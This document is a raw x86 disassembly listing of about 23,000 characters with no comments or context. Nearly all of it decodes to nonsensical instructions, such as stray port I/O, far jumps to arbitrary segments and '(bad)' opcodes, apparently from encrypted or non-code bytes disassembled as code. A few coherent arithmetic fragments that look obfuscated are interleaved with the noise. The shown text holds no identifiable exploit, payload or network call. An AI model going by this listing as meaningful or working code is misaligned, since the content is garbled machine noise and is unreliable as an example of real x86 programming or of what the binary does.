  409439:	imul   edi,DWORD PTR [edi+0x70],0xc7d4f970
  409440:	jno    0x4093fd
  409442:	inc    ebx
  409443:	sbb    dl,BYTE PTR [esi-0x53536463]
  409449:	sahf   
  40944a:	xchg   edx,eax
  40944b:	jecxz  0x409445
  40944d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40944e:	mov    ebx,0xa88bcbc
  409453:	test   eax,0x62aa13b0
  409458:	cs xchg esi,esi
  40945b:	gs test eax,0x944665ce
  409461:	in     eax,dx
  409462:	sub    BYTE PTR [esi],bh
  409464:	mov    ebp,0x8d427f7a
  409469:	popf   
  40946a:	xor    al,0x62
  40946c:	add    al,BYTE PTR [edi-0x6bd5c036]
  409472:	dec    eax
  409473:	loop   0x4093f9
  409475:	xchg   ebx,eax
  409476:	adc    DWORD PTR [edx+0x51],esp
  409479:	adc    DWORD PTR [ebx-0x35a8924f],esi
  40947f:	addr16 cmp ch,ah
  409482:	adc    al,0x76
  409484:	sub    eax,0x382fd980
  409489:	mov    dl,0xc8
  40948b:	dec    esi
  40948c:	xor    DWORD PTR [ecx-0x48bdd173],edx
  409492:	test   BYTE PTR [ecx],0xf3
  409495:	and    eax,0x9d055543
  40949a:	pop    edx
  40949b:	xchg   BYTE PTR [ebp+0x24],dh
  40949e:	and    DWORD PTR [edx-0x1e],0xffffffc7
  4094a2:	add    DWORD PTR [edi+eax*8+0x35],ebp
  4094a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094a7:	pusha  
  4094a8:	sbb    eax,0xbac3fd74
  4094ad:	jmp    0x1cf2:0x64f1fcc0
  4094b4:	shr    BYTE PTR [edx+0x2fdbdc2f],cl
  4094ba:	les    esi,FWORD PTR [edi]
  4094bc:	jae    0x4094f8
  4094be:	cmp    BYTE PTR [eax-0x9805d24],ah
  4094c4:	push   0x3bca3b21
  4094c9:	js     0x409456
  4094cb:	jo     0x40945f
  4094cd:	loop   0x409521
  4094cf:	int    0x83
  4094d1:	push   sp
  4094d3:	dec    ebp
  4094d4:	or     eax,0xd4fd676c
  4094d9:	add    bh,BYTE PTR [esi+esi*8-0x1e]
  4094dd:	mov    dh,BYTE PTR [esi-0x42aa05bc]
  4094e3:	push   0x1863b6e1
  4094e8:	in     eax,0x48
  4094ea:	inc    esp
  4094eb:	retf   0xf201
  4094ee:	xor    eax,DWORD PTR [eax]
  4094f0:	ins    BYTE PTR es:[edi],dx
  4094f1:	fld    TBYTE PTR [ecx+0x13]
  4094f4:	mov    ah,0xaa
  4094f6:	sahf   
  4094f7:	sahf   
  4094f8:	fld    st(6)
  4094fa:	jae    0x4094a5
  4094fc:	inc    ebx
  4094fd:	pop    ebx
  4094fe:	jnp    0x409507
  409500:	adc    al,0xb6
  409502:	push   ecx
  409503:	aas    
  409504:	xchg   BYTE PTR [ebx+0x753c5578],bh
  40950a:	sbb    al,0xe5
  40950c:	mov    cs,WORD PTR [edi-0x7e]
  40950f:	and    al,0x7f
  409511:	out    0x51,eax
  409513:	xor    BYTE PTR [ebp+0x1764b2d6],bl
  409519:	scas   al,BYTE PTR es:[edi]
  40951a:	adc    DWORD PTR [ebp+0x2f],edi
  40951d:	sub    eax,DWORD PTR [esi-0x76]
  409520:	imul   esp,DWORD PTR [eax],0xcc884c11
  409526:	ins    DWORD PTR es:[edi],dx
  409527:	out    dx,al
  409528:	mov    cl,BYTE PTR [eax+edi*4]
  40952b:	icebp  
  40952c:	mov    ebx,0x881a521b
  409531:	mov    edi,0xc5fcb65
  409536:	dec    edi
  409537:	idiv   BYTE PTR [eax]
  409539:	xchg   ecx,eax
  40953a:	data16 mov ah,0xc0
  40953d:	call   0xc010:0xd0831733
  409544:	out    dx,eax
  409545:	adc    DWORD PTR [edx-0x67],0x2b
  409549:	(bad)  
  40954b:	cmc    
  40954c:	add    al,0xf1
  40954e:	mov    esp,0x35aff59a
  409553:	outs   dx,BYTE PTR ds:[esi]
  409554:	xchg   edx,eax
  409555:	xor    BYTE PTR [eax-0x5c5cb410],cl
  40955b:	cwde   
  40955c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40955d:	jo     0x4095cb
  40955f:	or     eax,0xbc5b8e8b
  409564:	push   0x602df61e
  409569:	xchg   edi,eax
  40956a:	daa    
  40956b:	push   ss
  40956c:	push   ds
  40956d:	cmp    ecx,esi
  40956f:	and    dl,BYTE PTR [ecx-0x5d0a671e]
  409575:	aas    
  409576:	mov    WORD PTR [ecx+0xa04aebe],es
  40957c:	adc    dl,BYTE PTR [edi+0x74]
  40957f:	jle    0x4095bd
  409581:	adc    BYTE PTR fs:[esi-0x68],dl
  409585:	jle    0x409580
  409587:	cmp    ch,BYTE PTR [ebx+eax*4-0x76801744]
  40958e:	xchg   BYTE PTR gs:[ebx+0x32de3a49],bh
  409595:	in     al,dx
  409596:	xor    esp,DWORD PTR [esi]
  409598:	(bad)  
  409599:	mov    eax,0x791e9b47
  40959e:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095a0:	std    
  4095a1:	mov    edx,DWORD PTR [eax+0x5d]
  4095a4:	out    0x3d,al
  4095a6:	push   ecx
  4095a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095a8:	in     eax,0x61
  4095aa:	imul   ebp,ecx,0x2
  4095ad:	mov    bh,BYTE PTR [edx+0x1c]
  4095b0:	dec    eax
  4095b1:	cmp    DWORD PTR [eax],esp
  4095b3:	gs aaa 
  4095b5:	shl    BYTE PTR [edx+0x74],cl
  4095b8:	into   
  4095b9:	lds    esp,FWORD PTR [ebx+0x3a]
  4095bc:	outs   dx,BYTE PTR ds:[esi]
  4095bd:	xchg   edi,eax
  4095be:	adc    BYTE PTR [eax],cl
  4095c0:	xchg   ebx,eax
  4095c1:	adc    edi,0xfffffff4
  4095c4:	mov    bh,0xf3
  4095c6:	pop    ebp
  4095c7:	adc    DWORD PTR [ebx-0x4e5a7707],esp
  4095cd:	add    eax,0x89cfa432
  4095d2:	fs pop ebx
  4095d4:	sbb    eax,0xe8b8979e
  4095d9:	dec    ebp
  4095da:	in     eax,0xe6
  4095dc:	nop    DWORD PTR [edi]
  4095df:	inc    edx
  4095e0:	cld    
  4095e1:	fsubr  QWORD PTR [edx+0x47279e4e]
  4095e7:	jmp    0x95b456cb
  4095ec:	out    dx,al
  4095ed:	or     edi,DWORD PTR [esi]
  4095ef:	adc    esi,DWORD PTR [esi-0x5e909196]
  4095f5:	xchg   DWORD PTR [edx-0x4b],edi
  4095f8:	mov    eax,0x6953608
  4095fd:	push   ebp
  4095fe:	(bad)  
  4095ff:	idiv   DWORD PTR [esi]
  409601:	xor    eax,0x9ca9823a
  409606:	adc    BYTE PTR [esp+esi*4+0x3f],cl
  40960a:	sbb    ah,bl
  40960c:	inc    esi
  40960d:	jge    0x40959f
  40960f:	jge    0x4095df
  409611:	mov    esi,0x2d9e8689
  409616:	push   edi
  409617:	inc    ecx
  409618:	lahf   
  409619:	sbb    al,0xc0
  40961b:	jge    0x40966a
  40961d:	xchg   BYTE PTR [edi+0x12c2af23],al
  409623:	cmp    dh,BYTE PTR cs:[ebx+0x2d]
  409627:	lods   al,BYTE PTR ds:[esi]
  409628:	int    0xab
  40962a:	leave  
  40962b:	mov    ecx,0x9e4eb965
  409630:	mov    DWORD PTR cs:[ebx],esp
  409633:	sahf   
  409634:	add    edx,DWORD PTR [ebp-0x14]
  409637:	mov    DWORD PTR [ebp-0x14],edx
  40963a:	mov    edx,DWORD PTR [ebp-0xc]
  40963d:	mov    edi,DWORD PTR [ebp-0x24]
  409640:	xor    edx,eax
  409642:	jmp    0x409856
  409647:	dec    ebp
  409648:	iret   
  409649:	lods   eax,DWORD PTR ds:[esi]
  40964a:	dec    ebx
  40964b:	lods   eax,DWORD PTR ds:[esi]
  40964c:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  409653:	add    eax,0xf7b3c53c
  409658:	out    0x70,al
  40965a:	jo     0x4096c5
  40965c:	jg     0x4096ce
  40965e:	jo     0x4096d7
  409660:	ror    DWORD PTR [eax+edi*8],1
  409663:	(bad)  
  409664:	ins    BYTE PTR es:[edi],dx
  409665:	mov    ecx,DWORD PTR [edi+0x53bc7e21]
  40966b:	dec    ebp
  40966c:	sbb    esp,DWORD PTR [esi+0x7d]
  40966f:	(bad)  
  409670:	int    0xf7
  409672:	mov    al,ds:0x8dde5ab6
  409677:	push   esp
  409678:	sub    eax,0xa4de7b4f
  40967d:	lods   eax,DWORD PTR ds:[esi]
  40967e:	push   ebp
  40967f:	arpl   WORD PTR [ebx-0x29],dx
  409682:	stos   BYTE PTR es:[edi],al
  409683:	add    DWORD PTR [edi+0x54],0x7ac19ae1
  40968a:	cmp    DWORD PTR [edi-0x5d],esp
  40968d:	in     al,dx
  40968e:	adc    dl,0xe5
  409691:	dec    edx
  409692:	into   
  409693:	imul   edi,DWORD PTR ds:0x89caaefa,0xd
  40969a:	mov    bl,0x57
  40969c:	mov    cl,0xd1
  40969e:	icebp  
  40969f:	xchg   BYTE PTR [ebx+0x9],dh
  4096a2:	iret   
  4096a3:	cmp    BYTE PTR [ecx+0x111333b5],dh
  4096a9:	shr    DWORD PTR [ebp+0x23c903cb],1
  4096af:	adc    eax,0x4b2f14c1
  4096b4:	add    edx,DWORD PTR fs:[esi+0x74]
  4096b8:	int    0xc1
  4096ba:	sbb    ecx,DWORD PTR [edi+ebp*2-0x5606d561]
  4096c1:	mov    ecx,0xde12e660
  4096c6:	repz pop es
  4096c8:	sbb    esp,ecx
  4096ca:	mov    ebx,0xb2ac1909
  4096cf:	sbb    dl,0x87
  4096d2:	cdq    
  4096d3:	adc    DWORD PTR [ebp-0x7217e07],ecx
  4096d9:	loopne 0x40969f
  4096db:	dec    edi
  4096dc:	adc    eax,0xbde72e17
  4096e1:	pop    esp
  4096e2:	imul   ecx,DWORD PTR cs:[edx],0xae9434fe
  4096e9:	mov    ecx,0xef891b4d
  4096ee:	fdivp  st(7),st
  4096f0:	imul   esp,DWORD PTR [esi],0x2b72049f
  4096f6:	in     eax,dx
  4096f7:	inc    edx
  4096f8:	jae    0x409769
  4096fa:	xor    DWORD PTR [esp+ebx*8+0x6fba4eca],esp
  409701:	cmp    al,0x9
  409703:	and    al,BYTE PTR [edx]
  409705:	cmp    dl,BYTE PTR [ebp+0x4b]
  409708:	lods   eax,DWORD PTR ds:[esi]
  409709:	and    eax,0xc37e4f9e
  40970e:	jmp    0x4096e2
  409710:	loope  0x409700
  409712:	dec    edi
  409713:	ins    BYTE PTR es:[edi],dx
  409714:	idiv   BYTE PTR [eax]
  409716:	mov    ecx,0x752d086
  40971b:	pop    edx
  40971c:	add    BYTE PTR [esi],0xdb
  40971f:	dec    edi
  409720:	call   0xb63e:0x31e3e45b
  409727:	clc    
  409728:	mov    edi,0xd0e98d63
  40972d:	into   
  40972e:	rcr    ebx,0xb9
  409731:	test   BYTE PTR [edx],bl
  409733:	adc    BYTE PTR [esi],0xa8
  409736:	xor    ch,dh
  409738:	pop    ecx
  409739:	fcom   DWORD PTR [ecx-0x57]
  40973c:	jne    0x4096ff
  40973e:	xor    al,0x58
  409740:	or     BYTE PTR [edx],bh
  409742:	inc    eax
  409743:	cmp    DWORD PTR [edi+edi*2-0x28f2062c],eax
  40974a:	push   esp
  40974b:	arpl   WORD PTR [ebp+0x7848326b],bx
  409751:	jae    0x409744
  409753:	or     ebx,edi
  409755:	mov    esi,0x2df9800f
  40975a:	jmp    0xc126:0x8a186bf0
  409761:	mov    DWORD PTR [eax-0x76d039d1],ebp
  409767:	push   ss
  409768:	scas   al,BYTE PTR es:[edi]
  409769:	add    al,0x50
  40976b:	in     al,dx
  40976c:	adc    edx,DWORD PTR [ebx-0x29eae319]
  409772:	xchg   edx,eax
  409773:	je     0x409759
  409775:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409776:	mov    ebx,edx
  409778:	popa   
  409779:	in     al,0x37
  40977b:	or     eax,0xf1720cf8
  409780:	sbb    dh,BYTE PTR [eax]
  409782:	xchg   ebx,eax
  409783:	mov    ecx,0x52c5f8a9
  409788:	push   eax
  409789:	pop    esi
  40978a:	adc    DWORD PTR [edx+0x23],0x3bb021ca
  409791:	inc    edi
  409792:	jge    0x4097c0
  409794:	scas   al,BYTE PTR es:[edi]
  409795:	sar    ah,1
  409797:	fadd   st,st(7)
  409799:	sbb    eax,0xcf4b3996
  40979e:	or     esp,DWORD PTR [ebp-0x37]
  4097a1:	icebp  
  4097a2:	and    BYTE PTR [edx+0x475d5568],ch
  4097a8:	pop    ds
  4097a9:	adc    ch,BYTE PTR [ebx]
  4097ab:	stos   DWORD PTR es:[edi],eax
  4097ac:	out    0xa5,eax
  4097ae:	xchg   edx,eax
  4097af:	xor    bh,BYTE PTR [eax+0x419dc72e]
  4097b5:	or     DWORD PTR [esi+0x7d5e5d69],ecx
  4097bb:	shl    BYTE PTR [eax],cl
  4097bd:	scas   al,BYTE PTR es:[edi]
  4097be:	ins    DWORD PTR es:[edi],dx
  4097bf:	xor    al,0x7d
  4097c1:	sub    BYTE PTR [edi],dl
  4097c3:	bnd ret 
  4097c5:	pop    ss
  4097c6:	mov    cl,0xdc
  4097c8:	add    DWORD PTR [edx],eax
  4097ca:	cwde   
  4097cb:	jecxz  0x40979f
  4097cd:	call   0x246a:0x35f2081f
  4097d4:	add    dh,BYTE PTR [eax+0xbc804e3]
  4097da:	fadd   st(1),st
  4097dc:	push   ds
  4097dd:	jmp    0x706acf32
  4097e2:	aaa    
  4097e3:	sub    al,0x5f
  4097e5:	xchg   ebx,eax
  4097e6:	inc    edx
  4097e7:	sub    DWORD PTR [eax+0x25],0xd6646b57
  4097ee:	gs dec ecx
  4097f0:	mov    eax,ds:0xfa8562c9
  4097f5:	std    
  4097f6:	jb     0x4097cc
  4097f8:	jl     0x4097f7
  4097fa:	div    BYTE PTR ds:0xcb6f4695
  409800:	adc    eax,0xba8691e2
  409805:	shl    ecx,cl
  409807:	cmp    bl,ah
  409809:	jo     0x409848
  40980b:	jb     0x40986e
  40980d:	dec    ebx
  40980e:	hlt    
  40980f:	dec    esi
  409810:	inc    edi
  409811:	pusha  
  409812:	dec    ebp
  409813:	ja     0x409802
  409815:	mov    ebx,0x1eddbc3a
  40981a:	xchg   DWORD PTR [edi-0x13f92b0a],edi
  409820:	loope  0x409850
  409822:	or     al,0x2b
  409824:	or     ebp,ebp
  409826:	std    
  409827:	fadd   DWORD PTR [eax+0x64]
  40982a:	data16 das 
  40982c:	in     eax,dx
  40982d:	cld    
  40982e:	shr    BYTE PTR [eax+edi*2],cl
  409831:	jb     0x40985a
  409833:	push   ecx
  409834:	clc    
  409835:	mov    ds:0x7d505273,eax
  40983a:	ins    BYTE PTR es:[edi],dx
  40983b:	xchg   DWORD PTR [esi-0x79],edx
  40983e:	lsl    esi,WORD PTR [esi]
  409841:	mov    edx,0x461923e4
  409846:	ret    0x7d3
  409849:	shr    DWORD PTR [ebx+0x5],1
  40984c:	dec    ecx
  40984d:	mov    esi,0x6c89e689
  409852:	std    
  409853:	mov    esi,DWORD PTR [edx+0xfd103e5]
  409859:	scas   eax,DWORD PTR es:[edi]
  40985a:	xlat   BYTE PTR ds:[ebx]
  40985b:	mov    edi,DWORD PTR [ebp-0xc]
  40985e:	xor    edi,eax
  409860:	sub    edx,edi
  409862:	mov    edi,DWORD PTR [ebp-0xc]
  409865:	mov    ebx,DWORD PTR [ebp-0x14]
  409868:	xor    edi,eax
  40986a:	add    edi,ecx
  40986c:	imul   edi,ebx
  40986f:	mov    ebx,DWORD PTR [ebp-0x18]
  409872:	xor    ebx,eax
  409874:	sub    edx,ecx
  409876:	lea    edi,[edi+ebx*1+0x32729c]
  40987d:	cmp    edi,edx
  40987f:	jbe    0x408b6b
  409885:	mov    edx,DWORD PTR [ebp-0xc]
  409888:	jmp    0x409a9c
  40988d:	int3   
  40988e:	sub    eax,0xbde9be20
  409893:	push   0xffffffa9
  409895:	mov    ebp,0xc77bf628
  40989a:	xor    ah,BYTE PTR [edi]
  40989c:	dec    ebx
  40989d:	loopne 0x409883
  40989f:	jo     0x409911
  4098a1:	imul   edi,DWORD PTR [edi+0x70],0x18afd670
  4098a8:	pop    edx
  4098a9:	fidiv  WORD PTR [edi]
  4098ab:	dec    edx
  4098ac:	mov    ebx,0x975d9ff6
  4098b1:	(bad)  
  4098b2:	jmp    0x4098b8
  4098b4:	and    eax,0x9ac8f3fc
  4098b9:	test   al,0x38
  4098bb:	pop    ebx
  4098bc:	mov    WORD PTR [ecx+0x47],es
  4098bf:	xor    esp,DWORD PTR [ecx+esi*1-0x52]
  4098c3:	mov    esi,0xbfba665f
  4098c8:	add    al,0x81
  4098ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098cb:	rcl    BYTE PTR [edx],1
  4098cd:	lods   al,BYTE PTR ds:[esi]
  4098ce:	sar    DWORD PTR es:[edx+0x62c19fb4],1
  4098d5:	stos   BYTE PTR es:[edi],al
  4098d6:	sub    edi,DWORD PTR [edi-0x6cc47fef]
  4098dc:	dec    esi
  4098dd:	sub    eax,0xd57a0784
  4098e2:	dec    ebp
  4098e3:	adc    DWORD PTR [eax],0xf1a95897
  4098e9:	dec    eax
  4098ea:	jmp    0x40989e
  4098ec:	add    dh,BYTE PTR [ecx+ecx*2-0x4bd7b8e3]
  4098f3:	sbb    DWORD PTR [ebp+0x5cddcda6],esi
  4098f9:	jmp    0x532f:0xb483f3f9
  409900:	and    esp,edx
  409902:	and    edx,DWORD PTR [eax-0x60]
  409905:	lahf   
  409906:	adc    BYTE PTR [eax+edi*4-0x1e],0xf9
  40990b:	dec    eax
  40990c:	and    al,0x92
  40990e:	fcom   DWORD PTR fs:[ebx+0x2f]
  409912:	mov    DWORD PTR [edi-0x35],esi
  409915:	push   ds
  409916:	push   edx
  409917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409918:	outs   dx,DWORD PTR ds:[esi]
  409919:	sbb    DWORD PTR [ebx],ebx
  40991b:	add    al,0xb0
  40991d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40991e:	imul   esi,DWORD PTR [eax],0x18486c97
  409924:	xor    ch,dl
  409926:	in     eax,0x14
  409928:	mov    ebx,0x5c152ac9
  40992d:	nop
  40992e:	jbe    0x409965
  409930:	mul    BYTE PTR [ebp-0x3ee52f0d]
  409936:	dec    esi
  409937:	sbb    eax,0xa21727e5
  40993c:	(bad)  
  40993e:	and    eax,0x7cbd7c5e
  409943:	xor    ch,BYTE PTR ds:0xf8ff7367
  409949:	shl    al,1
  40994b:	xchg   ebp,eax
  40994c:	fiadd  DWORD PTR [ecx+ebx*8]
  40994f:	shl    DWORD PTR [ebx-0x18],1
  409952:	sahf   
  409953:	aas    
  409954:	push   es
  409955:	imul   eax,ebp,0x6f6522d7
  40995b:	pushf  
  40995c:	xlat   BYTE PTR ds:[ebx]
  40995d:	sahf   
  40995e:	inc    ebp
  40995f:	(bad)  [eax+0x597809f6]
  409965:	les    ebp,FWORD PTR [ebp+0x4]
  409968:	inc    edx
  409969:	xchg   ebp,eax
  40996a:	dec    ebp
  40996b:	inc    ebp
  40996c:	dec    edx
  40996d:	mov    DWORD PTR [eax-0x6c214d18],0x804b36db
  409977:	sub    al,ah
  409979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40997a:	adc    al,0xb3
  40997c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40997d:	shr    ebx,cl
  40997f:	and    ch,cl
  409981:	mov    cl,0x42
  409983:	xchg   dh,bh
  409985:	test   al,0xe
  409987:	xor    DWORD PTR [ebp+0x1157be23],0x47
  40998e:	(bad)  
  40998f:	int    0xc9
  409991:	or     esp,DWORD PTR [ecx+0x6b8bf008]
  409997:	dec    edx
  409998:	jmp    0x409956
  40999a:	div    DWORD PTR [ebx]
  40999c:	or     eax,0xd749f29d
  4099a1:	sar    bl,cl
  4099a3:	add    eax,DWORD PTR [ecx]
  4099a5:	mov    DWORD PTR [esi+0x26],0x4a5d4186
  4099ac:	ficomp DWORD PTR [esi-0x6a]
  4099af:	hlt    
  4099b0:	push   edx
  4099b1:	dec    eax
  4099b2:	sub    BYTE PTR [esi+ecx*4-0x54b19613],bl
  4099b9:	pop    ecx
  4099ba:	imul   eax,DWORD PTR [ecx-0x35],0x26484c6d
  4099c1:	int    0x65
  4099c3:	xor    al,0xc1
  4099c5:	dec    ebp
  4099c6:	add    ecx,esp
  4099c8:	xchg   BYTE PTR [ebx+0x61],ah
  4099cb:	push   edi
  4099cc:	jo     0x409a1c
  4099ce:	jns    0x409a05
  4099d0:	push   es
  4099d1:	sbb    eax,0xe355ae2f
  4099d6:	es cld 
  4099d8:	in     eax,0xeb
  4099da:	pop    es
  4099db:	add    eax,0x89e672a8
  4099e0:	and    ah,BYTE PTR [ebp-0x18]
  4099e3:	xor    al,0xfa
  4099e5:	sbb    DWORD PTR ds:0x76109d91,ebp
  4099eb:	pop    esi
  4099ec:	adc    BYTE PTR [ebx],ch
  4099ee:	dec    esp
  4099ef:	push   ds
  4099f0:	sub    DWORD PTR [eax+0x1b],0x8a606a5d
  4099f7:	mov    ecx,0x9b71b956
  4099fc:	mov    dl,0xe0
  4099fe:	xor    BYTE PTR [ebp+0x210880c2],dl
  409a04:	push   esi
  409a05:	jnp    0x4099c7
  409a07:	test   al,bl
  409a09:	clc    
  409a0a:	mov    al,ds:0xa835d005
  409a0f:	sahf   
  409a10:	mov    ds:0xbb9731d7,eax
  409a15:	add    BYTE PTR [ebp+0x34ef940b],dh
  409a1b:	pop    esi
  409a1c:	jnp    0x409a27
  409a1e:	inc    ebx
  409a1f:	pop    ebx
  409a20:	(bad)  
  409a21:	mov    cl,0x3d
  409a23:	scas   al,BYTE PTR es:[edi]
  409a24:	pushf  
  409a25:	es sub eax,0xa2e0b404
  409a2b:	dec    esi
  409a2c:	in     al,dx
  409a2d:	loopne 0x4099fb
  409a2f:	out    0x48,al
  409a31:	fld    QWORD PTR [edx+0x71]
  409a34:	adc    eax,0x95c6fea2
  409a39:	(bad)  
  409a3a:	pop    edx
  409a3b:	sub    DWORD PTR [esi-0x6a],0x3fa81be9
  409a42:	jmp    0x409a8a
  409a44:	into   
  409a45:	inc    ecx
  409a46:	ins    DWORD PTR es:[edi],dx
  409a47:	pop    edx
  409a48:	dec    edx
  409a49:	mov    bh,0x4a
  409a4b:	(bad)  
  409a4c:	shr    BYTE PTR [ecx+0x15119744],1
  409a52:	mov    ch,0x86
  409a54:	pop    ecx
  409a55:	xchg   edi,eax
  409a56:	mov    bh,0x43
  409a58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a59:	mov    ?,WORD PTR [ecx+0x6c]
  409a5c:	hlt    
  409a5d:	int    0xcb
  409a5f:	rcr    DWORD PTR [edx+0x16],1
  409a62:	jae    0x409a73
  409a64:	fcomp  QWORD PTR [esi-0x4a]
  409a67:	test   BYTE PTR [edx],dl
  409a69:	xchg   ecx,eax
  409a6a:	jl     0x409a33
  409a6c:	mov    ?,esi
  409a6e:	call   0x1687:0x935c45de
  409a75:	(bad)
  409a78:	cmp    al,0x6a
  409a7a:	out    0xa4,al
  409a7c:	imul   eax,DWORD PTR [ebp+0x22],0xffffff99
  409a80:	jno    0x409a2e
  409a82:	cmp    eax,0xc141b614
  409a87:	sbb    al,cl
  409a89:	adc    ch,BYTE PTR [esp+ebx*1+0x5a]
  409a8d:	mov    bh,0xc4
  409a8f:	mov    eax,0x371c8373
  409a94:	cmp    al,0x4b
  409a96:	push   esi
  409a97:	dec    DWORD PTR [eax+edi*4+0x1b]
  409a9b:	adc    al,0x8b
  409a9d:	jge    0x409a7b
  409a9f:	xor    edx,eax
  409aa1:	add    edx,ecx
  409aa3:	imul   edx,edi
  409aa6:	mov    edi,DWORD PTR [ebp-0x18]
  409aa9:	xor    edi,eax
  409aab:	add    edx,edi
  409aad:	mov    edi,DWORD PTR [ebp-0x8]
  409ab0:	lea    edx,[edx+edi*1+0x32729c]
  409ab7:	mov    DWORD PTR [ebp-0x8],edx
  409aba:	mov    edx,DWORD PTR [ebp-0x20]
  409abd:	jmp    0x409cd1
  409ac2:	popa   
  409ac3:	ja     0x409abc
  409ac5:	add    esi,ecx
  409ac7:	xor    DWORD PTR [ecx+0x75],0xffffffde
  409acb:	adc    al,0xb4
  409acd:	mov    al,dh
  409acf:	loopne 0x409a8c
  409ad1:	mov    al,ds:0x7070e2d9
  409ad6:	imul   edi,DWORD PTR [edi+0x70],0x8c9d8f70
  409add:	(bad)  
  409adf:	mov    WORD PTR [ebx],cs
  409ae1:	cmp    eax,0xd7f5a0b4
  409ae6:	sar    DWORD PTR [ecx],1
  409ae8:	sbb    cl,BYTE PTR [edi+0x69d8d15d]
  409aee:	xchg   ebp,eax
  409aef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409af0:	fidivr WORD PTR [edx+0x78890154]
  409af6:	lea    ebx,[edi-0x3c]
  409af9:	aad    0xd5
  409afb:	int3   
  409afc:	pushf  
  409afd:	pusha  
  409afe:	dec    ebx
  409aff:	mov    dl,0xc2
  409b01:	jg     0x409af8
  409b03:	inc    esp
  409b04:	nop
  409b05:	sbb    dh,ch
  409b07:	mov    ebp,DWORD PTR [edx+0x95cca22]
  409b0d:	outs   dx,DWORD PTR ds:[esi]
  409b0e:	dec    ecx
  409b0f:	je     0x409b4f
  409b11:	cwde   
  409b12:	lahf   
  409b13:	inc    esp
  409b14:	sbb    eax,0xfc64fbd8
  409b19:	jge    0x409acf
  409b1b:	jne    0x409af3
  409b1d:	push   ebx
  409b1e:	sub    BYTE PTR [eax-0x55],al
  409b21:	enter  0x12ab,0x3a
  409b25:	arpl   WORD PTR [eax+0x3f27cddb],bx
  409b2b:	cmp    BYTE PTR [edi+edi*4-0x6551b9b1],0x7
  409b33:	aam    0xc8
  409b35:	fcmovnb st,st(7)
  409b37:	aam    0x2b
  409b39:	adc    DWORD PTR ds:0xb688128,ebx
  409b3f:	pop    edi
  409b40:	pop    ds
  409b41:	adc    eax,0x9e50881d
  409b46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b47:	arpl   WORD PTR [edx],si
  409b49:	stos   DWORD PTR es:[edi],eax
  409b4a:	out    dx,eax
  409b4b:	xchg   esi,eax
  409b4c:	bound  ecx,QWORD PTR [ebp-0x72743d0a]
  409b52:	mov    ecx,0xfc663912
  409b57:	jmp    0x1d69:0xe2f71cd1
  409b5e:	pop    edi
  409b5f:	xchg   ebp,eax
  409b60:	pop    ebp
  409b61:	cdq    
  409b62:	mov    ch,0xd2
  409b64:	add    ecx,DWORD PTR ds:[ebx]
  409b67:	js     0x409b01
  409b69:	(bad)  
  409b6a:	and    dh,BYTE PTR [ebp-0x3f]
  409b6d:	popf   
  409b6e:	mov    BYTE PTR [eax+0x26],bl
  409b71:	in     eax,0xcc
  409b73:	fcomip st,st(3)
  409b75:	cmp    al,0x5e
  409b77:	jle    0x409b8b
  409b79:	dec    edi
  409b7a:	data16 jae 0x409b20
  409b7d:	ss jbe 0x409b83
  409b80:	cwde   
  409b81:	mov    ebp,0xdda257a1
  409b86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b87:	stc    
  409b88:	sti    
  409b89:	xchg   ecx,eax
  409b8a:	inc    edx
  409b8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b8c:	jecxz  0x409b3b
  409b8e:	pop    edx
  409b8f:	push   ss
  409b90:	pop    ebp
  409b91:	fild   DWORD PTR [ebx-0x4a]
  409b94:	fmul   QWORD PTR [eax+0x30]
  409b97:	repnz mov BYTE PTR [ebp+0x6e],bh
  409b9b:	sahf   
  409b9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b9d:	jmp    0xfb689da7
  409ba2:	and    al,0x39
  409ba4:	bound  eax,QWORD PTR [esi]
  409ba6:	arpl   WORD PTR [edx+0x2a],bx
  409ba9:	ror    DWORD PTR [esi],1
  409bab:	je     0x409b95
  409bad:	pop    DWORD PTR [edi]
  409baf:	xlat   BYTE PTR ds:[ebx]
  409bb0:	stos   BYTE PTR es:[edi],al
  409bb1:	imul   edi,DWORD PTR [esi-0x4d],0x48
  409bb5:	mov    ebp,0x5e44910a
  409bba:	hlt    
  409bbb:	add    eax,0x7380d42b
  409bc0:	(bad)  
  409bc1:	(bad)  
  409bc2:	ins    DWORD PTR es:[edi],dx
  409bc3:	mov    WORD PTR [eax+0x781fa660],ss
  409bc9:	mov    dh,0x4a
  409bcb:	std    
  409bcc:	call   0xef47:0xbb71631d
  409bd3:	jo     0x409bbc
  409bd5:	add    esp,DWORD PTR [ebp+0x182ac39a]
  409bdb:	inc    ebp
  409bdc:	in     eax,0x2f
  409bde:	js     0x409bf3
  409be0:	mov    edx,0xfae7fbb1
  409be5:	jb     0x409b8e
  409be7:	fs scas al,BYTE PTR es:[edi]
  409be9:	adc    al,0xf0
  409beb:	rcl    DWORD PTR [edx-0xad5aaba],cl
  409bf1:	xchg   esi,esi
  409bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bf4:	cld    
  409bf5:	sbb    DWORD PTR [eax+0x48],0x5b
  409bf9:	lds    edx,FWORD PTR [ebx-0x51291abb]
  409bff:	sbb    eax,DWORD PTR [edi]
  409c01:	add    eax,0x9c89c41d
  409c06:	test   eax,0xc0229155
  409c0b:	mov    ebp,0x5223c651
  409c10:	or     al,0x74
  409c12:	test   al,0x8d
  409c14:	(bad)  
  409c15:	cli    
  409c16:	add    al,0x1a
  409c18:	pop    ecx
  409c19:	(bad)  
  409c1a:	xchg   esi,eax
  409c1b:	and    eax,0x74ad2b4e
